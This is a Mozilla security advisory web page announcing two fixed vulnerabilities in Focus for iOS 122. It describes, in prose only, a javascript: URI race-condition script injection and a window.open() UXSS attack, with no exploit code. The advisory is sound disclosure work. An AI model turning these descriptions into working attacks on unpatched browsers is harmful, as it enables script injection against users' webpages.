  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2024-03

## Security Vulnerabilities fixed in Focus for iOS 122

Announced
January 22, 2024
Impact
critical
Products
Focus for iOS
Fixed in

* Focus for iOS 122

#### [#CVE-2024-0605: JavaScript URI running on top origin sites](#CVE-2024-0605)

Reporter
James Lee
Impact
critical
##### Description

Using a javascript: URI with a setTimeout race condition, an attacker can execute unauthorized scripts on top origin sites in urlbar. This bypasses security measures, potentially leading to arbitrary code execution or unauthorized actions within the user's loaded webpage.

##### References

* [Bug 1855575](https://bugzilla.mozilla.org/show_bug.cgi?id=1855575)

#### [#CVE-2024-0606: UXSS attack with window.open()](#CVE-2024-0606)

Reporter
James Lee
Impact
high
##### Description

An attacker could execute unauthorized script on a legitimate site through UXSS using window.open() by opening a javascript URI leading to unauthorized actions within the user's loaded webpage.

##### References

* [Bug 1855030](https://bugzilla.mozilla.org/show_bug.cgi?id=1855030)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


